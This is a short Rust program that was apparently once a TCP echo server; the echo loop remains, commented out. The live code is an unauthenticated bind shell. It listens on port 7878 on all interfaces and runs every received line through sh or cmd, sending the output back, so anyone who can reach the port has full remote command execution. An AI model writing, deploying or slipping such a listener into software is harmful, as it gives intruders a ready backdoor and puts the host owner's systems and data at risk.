use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::process::{Command, Output};

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 512*16];

    // loop {
    //     let nbytes = stream.read(&mut buffer).unwrap();
    //     if nbytes == 0 {
    //         return;
    //     }

    //     // 对消息进行处理，这里我们只是简单地将消息原样返回
    //     stream.write(&buffer[0..nbytes]).unwrap();
    // }
    loop {
        let nbytes = match stream.read(&mut buffer) {
            Ok(nbytes) => nbytes,
            Err(e) => {
                eprintln!("Error reading from stream: {}", e);
                return;
            }
        };
        if nbytes == 0 {
            return;
        }

        let command = String::from_utf8_lossy(&buffer[0..nbytes]).trim().to_string();
        let output = execute_command(&command);

        stream.write(&output.stdout).unwrap();
        stream.write(&output.stderr).unwrap();
    }
}
fn execute_command(command: &str) -> Output {
    if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command])
            .output()
            .unwrap()
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .unwrap()
    }
}

fn main() {
    let listener = TcpListener::bind("0.0.0.0:7878").unwrap();
    
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_client(stream);
            }
            Err(e) => {
                eprintln!("Unable to connect: {}", e);
            }
        }
    }
}